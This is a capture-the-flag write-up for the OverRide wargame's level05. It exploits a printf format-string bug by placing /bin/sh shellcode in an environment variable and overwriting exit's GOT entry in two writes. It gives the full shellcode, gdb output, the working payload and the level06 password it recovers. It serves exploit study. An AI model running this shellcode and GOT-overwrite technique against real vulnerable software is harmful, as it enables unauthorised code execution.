## Project README: Finding flag05

The [proGram](./source) given is taking a input from stdin, and print a lower case version of our input. The thing is, the program is using printf in a way that allow us to use `Format string attack`. 

### Analysis

Since we don't have any deadcode, system call or password read, we need to do a `ret to lib` or `shellcode into variable env`. We choose the second option here.

### Progress

First things, let's export our shellcode:

```sh
export shellcode="`python -c 'print("\x90" * 500 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`"
```

Next step, let's find out where our shellcode is stock:

```sh
level05@OverRide:~$ gdb -q ./level05 
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x getenv("shellcode")
0xffffdcff:	0x90909090
```

As we can see, our `shellcode` is at `0xffffdcff`.

Now, we need to know which address we would like to rewrite. So we when to change the jmp from exit to our shellcode.

```sh
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	push   edi
   0x08048448 <+4>:	push   ebx
=> 0x08048449 <+5>:	and    esp,0xfffffff0
   0x0804844c <+8>:	sub    esp,0x90
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:	mov    edx,eax
   0x080484e8 <+164>:	mov    eax,0x0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:	mov    edi,edx
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1
   0x080484fc <+184>:	cmp    ebx,eax
---Type <return> to continue, or q <return> to quit---
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:	push   0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

So the address we need to change is `0x080497e0`. We need to put `0xffffdcff` into `0x80497e0`. The following point is to find where we start to write if printf.

```sh
level05@OverRide:~$ python -c 'print("AAAA" + " %p"*30)' | ./level05 
aaaa 0x64 0xf7fcfac0 0xf7ec3add 0xffffd4bf 0xffffd4be (nil) 0xffffffff 0xffffd544 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```
Let's find the patern `AAAA` we are looking for `0x41414141` but the only things looking alike is `0x61616161` and when we print it into ascii is `aaaa`. As we can see into our [souce code](./source) inline 10, program switch every upper char into lower. so we start to right a the 10th address.

Resume: 

- `\xe0\x97\x04\x08` -> address to change in little endian
- `0xffffdcff` the address we need to write, in decimal it means: `4294958335`
- `Format string attack`

We have all our elements, let's cook our receipe.

Our payload will look like :

```sh
python -c 'print("\xe0\x97\x04\x08" + "%4294958335x" + "%10$n")'
```

Let's try it:

```sh 
level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "%4294958335x" + "%10$n")' | ./level05 
�level05@OverRide:~$ 
```

Nothing...

After looking into `gdb`:

```sh
(gdb) run <<< level05@OverRide:~$ $(python -c 'print("\xe0\x97\x04\x08" + "%4294958335x" + "%10$n")')
Starting program: /home/users/level05/level05 <<< level05@OverRide:~$ $(python -c 'print("\xe0\x97\x04\x08" + "%4294958335x" + "%10$n")')
level05@override:~$

Breakpoint 1, 0x08048513 in main ()
(gdb) x/64xw 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376	0xf7e45420	0x00000000	0x00000000
0x80497f0:	0xf7fcfac0	0x00000000	0x00000000	0x00000000
0x8049800:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049810:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049820:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049830:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049840:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049850:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049860:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049870:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049880:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049890:	0x00000000	0x00000000	0x00000000	0x00000000
0x80498a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x80498b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x80498c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x80498d0:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can see that our value have a strange value...
After some research, we realize that printf can only right 2147483647 bytes into ou memory and our address is way bigger then INT MAX.

Back to searching, after a few moments, we realize we had a buffer of 100 char which means we can overwrite more then one address.

So the idea is to write our big address in two time.

So the payload will look like:

```sh
python -c 'print("address of jmp exit" + "address of jmp + 2" + "%[nb byte for the last part - nb byte wrote]x" + "%[nb bytes remaining for the first part + some padding due to moving stack]x" + "%[place of the first address]n" + "%[place of the second address]n")'
```

Our address is : `0xffffdcff`
If we split it in two parts, it gives us:
`fff` and `dcff`. Since we need a bit of padding for our shellcode instead of `dcff` we will put `ddff` in order to expect to fall into `\x90`.

Okay let's create our payload.
For us it will be:

```sh
python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" +"%56823x" + "%10$n"  + "%8704x" + "%11$n")'
```

Let's try it: 

```sh
level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" +"%56823x" + "%10$n"  + "%8704x" + "%11$n")';cat) | ./level05
�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            64                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     f7fcfac0
whoami
level06
cd ../level06
cat .pa
cat: .pa: No such file or directory
cat .pass 
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```

And voila.